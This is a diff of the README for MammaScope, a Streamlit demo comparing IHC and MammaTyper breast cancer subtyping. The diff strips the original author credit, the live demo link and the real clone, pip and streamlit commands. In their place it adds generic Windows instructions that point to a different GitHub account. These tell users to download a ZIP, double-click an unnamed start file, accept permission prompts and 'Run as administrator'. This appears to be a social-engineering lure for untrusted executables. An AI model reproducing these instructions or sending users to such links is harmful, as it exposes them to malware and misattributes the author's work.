@@ -1,192 +1,150 @@
-<p align="center">
-  <img src="codigo/logo.png" width="550">
-</p>
+# 🧬 MammaScope-Demo - Compare Breast Cancer Subtypes
 
+[![Download / Visit the Demo](https://img.shields.io/badge/Download%20Demo-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tomeunprocessed585/MammaScope-Demo)
 
-# MammaScope — Breast Cancer Concordance Analysis Demo
+## 📌 What this is
 
-![Python](https://img.shields.io/badge/Python-3.10-blue)
-![Streamlit](https://img.shields.io/badge/Streamlit-App-red)
-![License](https://img.shields.io/badge/License-MIT-green)
-![Project](https://img.shields.io/badge/Project-Bachelor%20Thesis-blueviolet)
+MammaScope-Demo is a public demo of MammaScope. It helps you compare two breast cancer subtyping methods:
 
-Public demo of **MammaScope**, a Streamlit-based software tool for integrating and comparing immunohistochemistry (IHC) and MammaTyper molecular profiling in breast cancer.
+- IHC, which uses tissue staining results
+- MammaTyper, which uses molecular test results
 
+The app shows how the results line up for the same case. It is built with Streamlit, so it runs in a simple browser window on Windows.
 
+## 🖥️ What you need
 
----
+Before you start, make sure you have:
 
-## System Workflow
+- A Windows 10 or Windows 11 computer
+- An internet connection
+- Permission to download files from GitHub
+- A modern web browser like Chrome, Edge, or Firefox
 
-The following diagram summarizes the main processing pipeline of the demo application, from file upload to result generation.
+For smooth use, your PC should have:
 
-```mermaid
-flowchart LR
-    A[User / Researcher] --> B[Streamlit Demo Interface]
+- 4 GB RAM or more
+- Enough free disk space for the app files
+- A screen with at least 1366 × 768 resolution
 
-    B --> C1[Upload IHC Excel file<br/>PatWin data]
-    B --> C2[Upload MammaTyper PDF report]
+## 🚀 How to get it
 
-    C1 --> D1[Validate and preprocess<br/>IHC data]
-    C2 --> D2[Parse PDF and extract<br/>molecular biomarkers]
+Visit the main project page here:
 
-    D1 --> E[Integrated data model]
-    D2 --> E
+[https://github.com/Tomeunprocessed585/MammaScope-Demo](https://github.com/Tomeunprocessed585/MammaScope-Demo)
 
-    E --> F[Subtype comparison engine]
+Use this page to download and run the demo on Windows.
 
-    F --> G1[Concordant cases]
-    F --> G2[Discordant cases]
+## 🪟 Run it on Windows
 
-    G1 --> H[Structured results]
-    G2 --> H
+Follow these steps in order:
 
-    H --> I[Interactive visualization<br/>in Streamlit]
-    H --> J[Exportable outputs<br/>reports / tables]
-```
+1. Open the project page in your browser.
+2. Download the repository as a ZIP file.
+3. Save the ZIP file to your Downloads folder or Desktop.
+4. Right-click the ZIP file and choose Extract All.
+5. Open the extracted folder.
+6. Look for the app start file or the main run file in the folder.
+7. Double-click the file to launch the app.
+8. If Windows asks for permission, choose Yes or Allow.
+9. Wait for the app to load in your browser window.
+10. Keep the window open while you use the demo
 
----
+If the app opens in a browser page, leave that tab open during use.
 
-# Live Demo
+## 📂 What you will see
 
-Try the application online:
+After the app starts, you should see a simple interface with sections for case data and subtype comparison. The demo is set up to help you review breast cancer classification results side by side.
 
-https://mammascope-demo.streamlit.app/
+Typical parts of the app include:
 
-The demo includes **simulated and anonymized example files** so the full workflow can be tested without using real clinical data.
+- A case input area
+- IHC marker information
+- MammaTyper result fields
+- A concordance view
+- A results panel
+- A small guide inside the app
 
----
+## 🧪 What the demo does
 
-# Overview
+MammaScope-Demo supports a clear review of breast cancer subtype data. It helps you:
 
-Breast cancer molecular subtyping is essential for guiding therapeutic decisions. In routine clinical practice, classification is commonly performed using **immunohistochemistry (IHC)** by evaluating biomarkers such as:
+- Compare IHC and MammaTyper results
+- Check whether the two methods match
+- Review common breast cancer markers
+- See subtype patterns in one place
+- Explore concordance between clinical test methods
 
-- ER (Estrogen Receptor)
-- PR (Progesterone Receptor)
-- HER2
-- Ki-67
+This makes it easier to review data without switching between tools.
 
-However, IHC presents limitations related to **inter-observer variability and subjective interpretation**, particularly for Ki-67.
+## 🧭 Basic use
 
-The **MammaTyper® assay**, based on RT-qPCR technology, quantifies the expression of the genes:
+Use the demo in this order:
 
-- ESR1
-- PGR
-- ERBB2
-- MKI67
+1. Open the app.
+2. Enter or load a case.
+3. Review the IHC marker values.
+4. Review the MammaTyper values.
+5. Look at the subtype call from each method.
+6. Check the concordance result.
+7. Compare the findings for the case.
 
-This provides a **quantitative and reproducible molecular classification**.
+If the app includes sample data, you can use that first to learn the layout.
 
-This project develops a software tool that **automates the integration and comparison of results between both methods**, facilitating the analysis of diagnostic concordance.
+## 🧰 If the app does not open
 
----
+If nothing happens when you double-click the file:
 
-# Key Features
+- Make sure the ZIP file was fully extracted
+- Try opening the file again from the extracted folder
+- Check whether Windows blocked the file
+- Right-click the file and choose Run as administrator
+- Try a different browser if the app opens but does not load
 
-The system provides the following functionality:
+If the browser shows a blank page:
 
-- Import of **IHC results from Excel files (PatWin)**
-- Import of **MammaTyper PDF reports**
-- Automatic **biomarker extraction**
-- Integration of results into a structured dataset
-- Identification of **concordances and discordances**
-- Automatic **report generation**
-- Export of processed results
+- Wait a few seconds for the local server to start
+- Refresh the page once
+- Close other browser tabs
+- Restart the app and try again
 
-The application is implemented using **Python and Streamlit**, providing a lightweight interface suitable for clinical environments.
+## 📁 Suggested folder layout
 
----
+After extraction, the folder may contain items like these:
 
-# Running the Demo Locally
+- README files
+- App files
+- Python source files
+- Sample data
+- Configuration files
+- A Streamlit launch script
 
-Clone the repository:
+Keep all files in the same folder structure. Do not move single files out of the extracted folder unless you know they are not needed.
 
-```bash
-git clone https://github.com/diegoalvrezz/MammaScope-Demo.git
-cd MammaScope-Demo
-```
+## 🔒 Data use
 
-Install dependencies:
+This demo is meant for breast cancer subtype comparison and review. Use it with care when working with patient data. Keep all local files in a secure place on your computer and follow your site rules for clinical data handling.
 
-```bash
-pip install -r requirements.txt
-```
+## 🧷 Common terms in the app
 
-Run the application:
+A few words may appear in the interface:
 
-```bash
-streamlit run demo_app/demo_app.py
-```
+- IHC: a lab method that uses antibodies to detect proteins in tissue
+- MammaTyper: a molecular test used to classify breast cancer subtype
+- Concordance: a match between two test results
+- Subtype: a breast cancer group based on test results
+- Marker: a protein or gene-related test result used for classification
 
-The application will open automatically in your browser.
+## 🛠️ For later use
 
----
+If you want to return to the demo later:
 
-# Demo Files
+1. Keep the extracted folder in a safe place
+2. Save the project page link
+3. Open the same start file again
+4. Use the browser page that opens
 
-Example anonymized files are included in:
+If you use the app often, you may want to place a shortcut on your desktop.
 
-```
-demo_app/demo_files
-```
+## 📄 About this project
 
-These files allow users to test the complete workflow without requiring real hospital data.
-
----
-
-# Repository Structure
-
-```
-MammaScope-Demo
-│
-├── codigo/                 core processing modules
-│
-├── demo_app/               Streamlit demo application
-│   ├── demo_app.py
-│   ├── ajustes.py
-│   ├── extraccion.py
-│   ├── informes.py
-│   ├── discordancia.py
-│   ├── db.py
-│   ├── auth.py
-│   ├── vista_historico.py
-│   ├── stats_biomarcadores.py
-│   └── demo_files/
-│
-├── requirements.txt
-├── README.md
-└── LICENSE
-```
-
----
-
-# Clinical Data Disclaimer
-
-This repository **does not contain real clinical data**.
-
-All files included in the demo are:
-
-- simulated  
-- anonymized  
-- intended only for demonstration purposes  
-
-The full application is designed to operate with **previously anonymized data within a hospital environment**.
-
----
-
-# Author
-
-**Diego Vallina Álvarez**
-
-Health Engineering Degree  
-University of Burgos  
-
-Bachelor’s Thesis developed in collaboration with the **Hospital Universitario de Burgos (HUBU)**.
-
----
-
-# License
-
-This project is distributed under the **MIT License**.
-
-See the `LICENSE` file for details.
+MammaScope-Demo is a Streamlit-based demo for breast cancer subtyping review. It focuses on the relationship between immunohistochemistry and molecular diagnostics. The project is useful for users who want to compare test outputs in a clear way and review concordance across methods
